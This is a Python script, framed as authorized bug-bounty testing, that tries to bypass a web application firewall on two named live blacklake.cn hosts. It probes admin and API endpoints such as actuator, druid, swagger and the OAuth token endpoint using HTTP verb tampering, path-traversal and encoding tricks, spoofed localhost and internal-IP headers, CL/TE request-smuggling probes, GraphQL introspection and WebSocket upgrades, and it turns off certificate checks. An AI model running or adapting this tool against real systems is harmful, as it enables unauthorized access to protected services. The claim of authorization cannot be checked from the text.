#!/usr/bin/env python3
"""
WAF bypass testing script for authorized security testing on butian platform.
Targets: jimureport.blacklake.cn, beta.blacklake.cn
Only detect, do NOT exploit.
"""

import requests
import time
import ssl
import socket
import json
import http.client
from urllib.parse import urlparse

OUTPUT_FILE = "/mnt/c/Users/28123/BugBounty-Toolkit/output/blacklake/waf_bypass_results.txt"
RATE_LIMIT_MS = 500  # ms between requests
TIMEOUT = 8

BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Origin': 'https://web.blacklake.cn',
    'Accept': 'text/html,application/json,*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
}

class RateLimiter:
    def __init__(self, ms):
        self.interval = ms / 1000.0
        self.last = 0

    def wait(self):
        now = time.time()
        elapsed = now - self.last
        if elapsed < self.interval:
            time.sleep(self.interval - elapsed)
        self.last = time.time()

limiter = RateLimiter(RATE_LIMIT_MS)

results = []

def log_result(target, endpoint, technique, method, status, length, summary, req_url=""):
    entry = {
        'target': target,
        'endpoint': endpoint,
        'technique': technique,
        'method': method,
        'status': status,
        'length': length,
        'summary': summary[:200],
        'url': req_url,
    }
    results.append(entry)
    flag = "*** BYPASS ***" if status not in [405, 403, 401, 302] else ""
    line = f"  [{method:8s}] {technique:50s} -> {status:3d} ({length:8d}B) {summary[:80]:80s} {flag}"
    print(line)
    return entry

def request_raw(target, endpoint, method="GET", headers=None, data=None, use_http_1_0=False):
    """Make HTTP request using raw socket for HTTP version control."""
    parsed = urlparse(target if target.startswith('http') else f"https://{target}")
    host = parsed.hostname or target
    port = parsed.port or 443
    is_https = parsed.scheme == 'https' or port == 443

    path = endpoint

    if not is_https:
        port = 80

    http_ver = "HTTP/1.0" if use_http_1_0 else "HTTP/1.1"

    if headers is None:
        hdrs = dict(BASE_HEADERS)
    else:
        hdrs = dict(headers)

    if 'Host' not in hdrs:
        hdrs['Host'] = host

    req_line = f"{method} {path} {http_ver}\r\n"
    for k, v in hdrs.items():
        req_line += f"{k}: {v}\r\n"

    if data:
        body = data if isinstance(data, bytes) else data.encode()
        if 'Content-Length' not in hdrs:
            req_line += f"Content-Length: {len(body)}\r\n"
        req_line += "\r\n"
        req_line_bytes = req_line.encode() + body
    else:
        req_line += "\r\n"
        req_line_bytes = req_line.encode()

    try:
        if is_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = socket.create_connection((host, port), timeout=TIMEOUT)
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            ssock.sendall(req_line_bytes)
            resp = b""
            while True:
                try:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"\r\n\r\n" in resp and len(resp) > 10000:
                        break
                except socket.timeout:
                    break
            ssock.close()
        else:
            sock = socket.create_connection((host, port), timeout=TIMEOUT)
            sock.sendall(req_line_bytes)
            resp = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"\r\n\r\n" in resp and len(resp) > 10000:
                        break
                except socket.timeout:
                    break
            sock.close()

        # Parse response
        header_end = resp.find(b"\r\n\r\n")
        if header_end == -1:
            return None, "no response"

        status_line = resp[:resp.find(b"\r\n")].decode(errors='ignore')
        body = resp[header_end+4:]

        # Parse status code
        parts = status_line.split(' ')
        try:
            status_code = int(parts[1])
        except:
            status_code = 0

        return status_code, body.decode(errors='ignore')[:200]
    except Exception as e:
        return None, str(e)[:100]

def test_endpoint(target, endpoint, method="GET", headers=None, data=None, technique="baseline", use_requests=True, use_http_1_0=False):
    """Test an endpoint with a given method and headers."""
    url = f"https://{target}{endpoint}" if not target.startswith('http') else f"{target}{endpoint}"

    limiter.wait()

    try:
        if use_requests:
            sess = requests.Session()
            hdrs = dict(BASE_HEADERS)
            if headers:
                hdrs.update(headers)

            resp = sess.request(
                method=method,
                url=url,
                headers=hdrs,
                data=data,
                timeout=TIMEOUT,
                verify=False,
                allow_redirects=False,
            )
            status = resp.status_code
            length = len(resp.content)
            body_preview = resp.text[:200].replace('\n', ' ').replace('\r', '')
            return status, length, body_preview
        else:
            host = target if '/' not in target else target.split('/')[0]
            status, body = request_raw(target, endpoint, method=method, headers=headers, data=data, use_http_1_0=use_http_1_0)
            if status:
                return status, len(body), body[:200]
            return None, 0, body
    except requests.exceptions.Timeout:
        return None, 0, "TIMEOUT"
    except Exception as e:
        return None, 0, str(e)[:100]


def test_baseline(target, endpoint):
    """Get baseline response."""
    status, length, summary = test_endpoint(target, endpoint, "GET", technique="baseline")
    log_result(target, endpoint, "baseline (GET)", "GET", status, length, summary)
    return status


def test_methods(target, endpoint):
    """Test HTTP method confusion."""
    methods = [
        "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
        "PROPFIND", "MOVE", "COPY", "MKCOL", "LOCK", "UNLOCK",
        "TRACE", "CONNECT", "SEARCH", "SUBSCRIBE", "POLL",
        "PROPPATCH", "REPORT", "VIEW", "LINK", "UNLINK",
        "PURGE", "POKE",
    ]
    for method in methods:
        status, length, summary = test_endpoint(target, endpoint, method, technique=f"method_{method}")
        log_result(target, endpoint, f"method_{method}", method, status, length, summary)


def test_path_manipulations(target, base_endpoint):
    """Test path manipulation bypass techniques."""

    manipulations = [
        (f"{base_endpoint}/", "trailing_slash"),
        (f"//{base_endpoint.lstrip('/')}", "double_slash_prefix"),
        (f"/xxx/../{base_endpoint.lstrip('/')}", "path_traversal"),
        (f"/./{base_endpoint.lstrip('/')}", "dot_slash"),
        (f"/%2e/{base_endpoint.lstrip('/')}", "url_encoded_dot"),
        (f"/%2e%2e/{base_endpoint.lstrip('/')}", "url_encoded_double_dot"),
        (f"/random{base_endpoint}", "random_prefix"),
        (f"{base_endpoint}.json", "append_json"),
        (f"{base_endpoint}.xml", "append_xml"),
        (f"{base_endpoint}.html", "append_html"),
        (f"{base_endpoint}?", "empty_query"),
        (f"{base_endpoint}?x=1", "query_param"),
        (f"{base_endpoint}%00", "null_byte"),
        (f"{base_endpoint}%20", "space_suffix"),
        (f"{base_endpoint};.css", "param_pollution"),
        (f"{base_endpoint}%3F", "encoded_question"),
        (f"{base_endpoint}..%00/", "null_dot_dot"),
    ]

    for path, technique in manipulations:
        status, length, summary = test_endpoint(target, path, technique=f"path_{technique}")
        log_result(target, base_endpoint, f"path_{technique}", "GET", status, length, summary)


def test_case_switching(target, endpoint):
    """Test case switching on path."""
    parts = endpoint.strip('/').split('/')
    for i, part in enumerate(parts):
        # Upper
        alt_parts = parts.copy()
        alt_parts[i] = part.upper()
        path = '/' + '/'.join(alt_parts)
        status, length, summary = test_endpoint(target, path, technique=f"case_upper_{part}")
        log_result(target, endpoint, f"case_upper_{part}", "GET", status, length, summary)

        # Capitalize
        alt_parts = parts.copy()
        alt_parts[i] = part.capitalize()
        path = '/' + '/'.join(alt_parts)
        status, length, summary = test_endpoint(target, path, technique=f"case_cap_{part}")
        log_result(target, endpoint, f"case_cap_{part}", "GET", status, length, summary)


def test_url_encoding(target, endpoint):
    """Test URL encoding bypass."""
    path = endpoint
    # Encode each character of the last path segment
    last_segment = endpoint.rstrip('/').split('/')[-1]
    prefix = endpoint.rstrip('/')[:-(len(last_segment))]

    for i, ch in enumerate(last_segment):
        encoded = hex(ord(ch))[2:]
        encoded_seg = last_segment[:i] + f"%{encoded}" + last_segment[i+1:]
        new_path = prefix + encoded_seg
        status, length, summary = test_endpoint(target, new_path, technique=f"url_encode_char_{i}_{ch}")
        log_result(target, endpoint, f"url_encode_char_{i}_{ch}", "GET", status, length, summary)


def test_double_url_encoding(target, endpoint):
    """Test double URL encoding."""
    last_segment = endpoint.rstrip('/').split('/')[-1]
    prefix = endpoint.rstrip('/')[:-(len(last_segment))]

    for i, ch in enumerate(last_segment):
        hex_val = hex(ord(ch))[2:]
        # Double encode %25 to get %2525XX
        double_enc = f"%25{hex_val}"
        encoded_seg = last_segment[:i] + double_enc + last_segment[i+1:]
        new_path = prefix + encoded_seg
        status, length, summary = test_endpoint(target, new_path, technique=f"double_encode_char_{i}_{ch}")
        log_result(target, endpoint, f"double_encode_char_{i}_{ch}", "GET", status, length, summary)


def test_header_combinations(target, endpoint):
    """Test various header injection techniques."""

    header_sets = [
        # Single headers (re-testing more)
        ({'X-Forwarded-For': '127.0.0.1'}, "X-Forwarded-For"),
        ({'X-Real-IP': '127.0.0.1'}, "X-Real-IP"),
        ({'X-Original-URL': '/'}, "X-Original-URL=slash"),
        ({'X-Original-URL': endpoint}, "X-Original-URL=endpoint"),
        ({'X-Rewrite-URL': '/'}, "X-Rewrite-URL"),
        ({'X-HTTP-Method-Override': 'GET'}, "X-HTTP-Method-Override"),
        ({'X-Forwarded-Proto': 'https'}, "X-Forwarded-Proto"),
        ({'X-Forwarded-Host': 'localhost'}, "X-Forwarded-Host=localhost"),
        ({'Via': '1.0 localhost'}, "Via"),

        # Combinations
        ({'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1', 'X-Original-URL': '/'}, "combo_Fwd+Real+OrigURL"),
        ({'X-Forwarded-For': '127.0.0.1', 'X-Rewrite-URL': '/'}, "combo_Fwd+Rewrite"),
        ({'X-Original-URL': endpoint, 'X-Rewrite-URL': endpoint}, "combo_Orig+Rewrite"),
        ({'X-Forwarded-For': '127.0.0.1', 'X-Forwarded-Host': 'localhost', 'X-Forwarded-Proto': 'https'}, "combo_FwdHostProto"),
        ({'X-Original-URL': '/', 'X-HTTP-Method-Override': 'GET'}, "combo_OrigURL+Override"),
        ({'X-Custom-IP-Authorization': '127.0.0.1'}, "X-Custom-IP-Auth"),
        ({'X-Originating-IP': '127.0.0.1'}, "X-Originating-IP"),
        ({'X-Remote-IP': '127.0.0.1'}, "X-Remote-IP"),
        ({'X-Client-IP': '127.0.0.1'}, "X-Client-IP"),
        ({'X-Host': '127.0.0.1'}, "X-Host"),
        ({'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1', 'X-Forwarded-Host': 'localhost',
          'X-Forwarded-Proto': 'https', 'X-Original-URL': '/'}, "mega_combo"),

        # Internal network headers
        ({'X-Forwarded-For': '10.0.0.1'}, "XFF_internal_10"),
        ({'X-Forwarded-For': '172.16.0.1'}, "XFF_internal_172"),
        ({'X-Forwarded-For': '192.168.1.1'}, "XFF_internal_192"),
        ({'X-Forwarded-For': '127.0.0.1', 'User-Agent': ''}, "XFF_blank_ua"),
        ({'Referer': 'https://web.blacklake.cn/admin/'}, "Referer_bypass"),

        # Content-Type switching with POST
        ({'Content-Type': 'application/xml'}, "CT_xml"),
        ({'Content-Type': 'application/json'}, "CT_json"),
        ({'Content-Type': 'text/plain'}, "CT_plain"),
        ({'Content-Type': 'multipart/form-data; boundary=--boundary'}, "CT_multipart"),
        ({'Content-Type': 'application/x-www-form-urlencoded'}, "CT_formurl"),
        ({'Content-Type': 'text/html'}, "CT_html"),

        # Accept headers
        ({'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, "Accept_browser"),
        ({'Accept': 'application/json'}, "Accept_json"),
    ]

    for headers, technique in header_sets:
        # Use POST for content-type tests, GET for others
        method = "POST" if technique.startswith("CT_") else "GET"
        data = "<xml>test</xml>" if technique == "CT_xml" else "{}" if technique == "CT_json" else None
        status, length, summary = test_endpoint(target, endpoint, method, headers=headers, data=data, technique=f"header_{technique}")
        log_result(target, endpoint, f"header_{technique}", method, status, length, summary)


def test_http_10_downgrade(target, endpoint):
    """Test HTTP/1.0 downgrade attack."""
    for use_http_1_0 in [True, False]:
        technique = "http_1_0" if use_http_1_0 else "http_1_1"
        limiter.wait()
        status, body = request_raw(target, endpoint, method="GET", use_http_1_0=use_http_1_0)
        if status:
            log_result(target, endpoint, f"proto_{technique}", "GET", status, len(body), body[:200])
        else:
            log_result(target, endpoint, f"proto_{technique}", "GET", None, 0, body[:100])


def test_request_smuggling(target, endpoint):
    """Test request smuggling hints."""
    # Transfer-Encoding: chunked with chunked body
    chunked_body = "0\r\n\r\n"
    headers = {'Transfer-Encoding': 'chunked', 'Content-Type': 'text/plain'}
    status, length, summary = test_endpoint(target, endpoint, "POST", headers=headers, data=chunked_body, technique="TE_chunked")
    log_result(target, endpoint, "TE_chunked", "POST", status, length, summary)

    # Content-Length with wrong value
    headers = {'Content-Length': '0'}
    status, length, summary = test_endpoint(target, endpoint, "POST", headers=headers, data="test", technique="CL_wrong")
    log_result(target, endpoint, "CL_wrong", "POST", status, length, summary)

    # Both CL + TE (smuggling signature)
    headers = {'Transfer-Encoding': 'chunked', 'Content-Length': '4'}
    status, length, summary = test_endpoint(target, endpoint, "POST", headers=headers, data="test", technique="CL_TE_smuggle")
    log_result(target, endpoint, "CL_TE_smuggle", "POST", status, length, summary)


def test_websocket(target, path="/ws"):
    """Test WebSocket connection."""
    import socket as sock_mod
    import base64
    import hashlib

    limiter.wait()
    try:
        host = target
        key = base64.b64encode(hashlib.md5(b"test").hexdigest().encode()).decode()

        ws_headers = {
            'Host': host,
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': key,
            'Sec-WebSocket-Version': '13',
            'Origin': 'https://web.blacklake.cn',
        }

        # Use raw socket for WebSocket upgrade attempt
        sock = socket.create_connection((host, 443), timeout=TIMEOUT)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=host)

        req = f"GET {path} HTTP/1.1\r\n"
        for k, v in ws_headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"

        ssock.sendall(req.encode())
        resp = b""
        while True:
            try:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    break
            except socket.timeout:
                break
        ssock.close()

        status_line = resp[:resp.find(b"\r\n")].decode(errors='ignore')
        parts = status_line.split(' ')
        try:
            status_code = int(parts[1])
        except:
            status_code = 0

        upgrade = b"Upgrade: websocket" in resp or b"upgrade: websocket" in resp
        extra = " (101 Upgrade!)" if status_code == 101 else ""
        log_result(target, path, f"websocket_{path}", "GET", status_code, len(resp), status_line[:100] + extra)
    except Exception as e:
        log_result(target, path, f"websocket_{path}", "GET", None, 0, str(e)[:100])


def write_results():
    """Write all results to output file."""

    # Group results by target and endpoint
    by_target = {}
    for r in results:
        t = r['target']
        if t not in by_target:
            by_target[t] = {}
        e = r['endpoint']
        if e not in by_target[t]:
            by_target[t][e] = []
        by_target[t][e].append(r)

    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("WAF BYPASS RESULTS - Authorized Security Testing (Butian)\n")
        f.write("=" * 80 + "\n\n")

        for target_name, endpoints in by_target.items():
            f.write(f"\n{'#' * 70}\n")
            f.write(f"Target: {target_name}\n")
            f.write(f"{'#' * 70}\n\n")

            for endpoint_name, tests in endpoints.items():
                f.write(f"\n{'-' * 60}\n")
                f.write(f"Endpoint: {endpoint_name}\n")
                f.write(f"{'-' * 60}\n")

                # Baseline
                baselines = [t for t in tests if t['technique'] == 'baseline']
                if baselines:
                    b = baselines[0]
                    f.write(f"  Baseline: {b['status']} ({b['length']}B)\n\n")

                f.write(f"  {'Method':8s} {'Technique':45s} {'Status':6s} {'Length':10s} {'Summary'}\n")
                f.write(f"  {'-'*8} {'-'*45} {'-'*6} {'-'*10} {'-'*50}\n")

                for t in tests:
                    if t['technique'] == 'baseline':
                        continue
                    flag = " <<< BYPASS" if t['status'] not in [405, 403, 401, 302, None] else ""
                    f.write(f"  {t['method']:8s} {t['technique']:45s} {str(t['status']):6s} {str(t['length']):10s} {t['summary'][:50]:50s}{flag}\n")

                # Summary of bypasses for this endpoint
                bypasses = [t for t in tests if t['status'] not in [405, 403, 401, 302, None]]
                if bypasses:
                    f.write(f"\n  >>> Successful bypasses for {endpoint_name}:\n")
                    for b in bypasses:
                        f.write(f"      [{b['method']:8s}] {b['technique']} -> {b['status']} ({b['length']}B)\n")
                        if b['url']:
                            f.write(f"      URL: {b['url']}\n")

            # Overall bypass summary for target
            all_bypasses = [t for t in tests]  # wrong scope, let me fix
        # Recalculate
        all_bypasses = [t for t in results if t['status'] not in [405, 403, 401, 302, None] and t['status'] is not None]
        if all_bypasses:
            f.write(f"\n{'=' * 70}\n")
            f.write("OVERALL SUCCESSFUL BYPASSES\n")
            f.write(f"{'=' * 70}\n\n")
            for b in all_bypasses:
                f.write(f"  [{b['method']:8s}] {b['technique']:45s} -> {b['status']:3d} ({b['length']:8d}B) on {b['target']}{b['endpoint']}\n")
        else:
            f.write(f"\n{'=' * 70}\n")
            f.write("NO SUCCESSFUL BYPASSES FOUND\n")
            f.write(f"{'=' * 70}\n")
            f.write("All endpoints returned 401/403/405 or timed out.\n")
            f.write("Consider trying more advanced techniques or different endpoints.\n")

    print(f"\n\nResults written to {OUTPUT_FILE}")


def run_jimureport_tests():
    """Run tests on jimureport.blacklake.cn."""
    target = "jimureport.blacklake.cn"
    endpoints = [
        "/swagger-ui.html",
        "/actuator/health",
        "/druid/index.html",
        "/v2/api-docs",
        "/v3/api-docs",
        "/api/swagger-ui.html",
        "/actuator",
        "/druid",
    ]

    for endpoint in endpoints:
        print(f"\n{'='*60}")
        print(f"Testing {target}{endpoint}")
        print(f"{'='*60}")

        # Baseline
        baseline = test_baseline(target, endpoint)
        print(f"  Baseline: {baseline}")

        # If baseline is already 200, skip advanced tests
        if baseline and baseline < 400:
            print(f"  Skipping advanced tests (already accessible: {baseline})")
            continue

        print(f"\n  --- Method confusion ---")
        test_methods(target, endpoint)

        print(f"\n  --- Path manipulations ---")
        test_path_manipulations(target, endpoint)

        print(f"\n  --- Case switching ---")
        test_case_switching(target, endpoint)

        print(f"\n  --- URL encoding ---")
        test_url_encoding(target, endpoint)

        print(f"\n  --- Double URL encoding ---")
        test_double_url_encoding(target, endpoint)

        print(f"\n  --- Header injections ---")
        test_header_combinations(target, endpoint)

        print(f"\n  --- HTTP protocol downgrade ---")
        test_http_10_downgrade(target, endpoint)

        print(f"\n  --- Request smuggling hints ---")
        test_request_smuggling(target, endpoint)


def run_beta_tests():
    """Run tests on beta.blacklake.cn."""
    target = "beta.blacklake.cn"

    # Endpoints to test with various methods
    endpoints = [
        "/api/v3/api-docs",
        "/api/swagger-ui/index.html",
        "/api/oauth/token",
        "/api/actuator/gateway/routes",
        "/api/v2/api-docs",
        "/api/swagger-resources",
        "/api/openapi.json",
        "/api/configuration/metadata",
        "/api/api-docs",
        "/api/actuator/health",
        "/api/druid/index.html",
        "/api/actuator",
    ]

    for endpoint in endpoints:
        print(f"\n{'='*60}")
        print(f"Testing {target}{endpoint}")
        print(f"{'='*60}")

        baseline = test_baseline(target, endpoint)
        print(f"  Baseline: {baseline}")

        if baseline and baseline < 400:
            print(f"  Skipping advanced tests (already accessible: {baseline})")
            continue

        print(f"\n  --- Method confusion ---")
        test_methods(target, endpoint)

        print(f"\n  --- Path manipulations ---")
        test_path_manipulations(target, endpoint)

        print(f"\n  --- Header injections ---")
        test_header_combinations(target, endpoint)

        print(f"\n  --- URL encoding ---")
        test_url_encoding(target, endpoint)

    # GraphQL test
    print(f"\n{'='*60}")
    print(f"Testing GraphQL on {target}")
    print(f"{'='*60}")
    gql_query = '{"query":"{__schema{types{name}}}"}'
    status, length, summary = test_endpoint(target, "/api/graphql", "POST",
                                             headers={'Content-Type': 'application/json'},
                                             data=gql_query,
                                             technique="graphql_schema")
    log_result(target, "/api/graphql", "graphql_schema", "POST", status, length, summary)

    # Test /api/graphql with GET
    status, length, summary = test_endpoint(target, "/api/graphql?query={__schema{types{name}}}", "GET", technique="graphql_get")
    log_result(target, "/api/graphql", "graphql_get", "GET", status, length, summary)

    # WebSocket test
    print(f"\n  --- WebSocket tests ---")
    test_websocket(target, "/ws")
    test_websocket(target, "/api/ws")


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print("WAF Bypass Testing - Authorized Security Testing (Butian)")
    print("=" * 60)
    print("Target 1: jimureport.blacklake.cn")
    print("Target 2: beta.blacklake.cn")
    print("=" * 60)

    # Test Target 1
    print("\n\n" + "#" * 60)
    print("# TARGET 1: jimureport.blacklake.cn")
    print("#" * 60)
    run_jimureport_tests()

    # Test Target 2
    print("\n\n" + "#" * 60)
    print("# TARGET 2: beta.blacklake.cn")
    print("#" * 60)
    run_beta_tests()

    # Write results
    write_results()


if __name__ == "__main__":
    main()
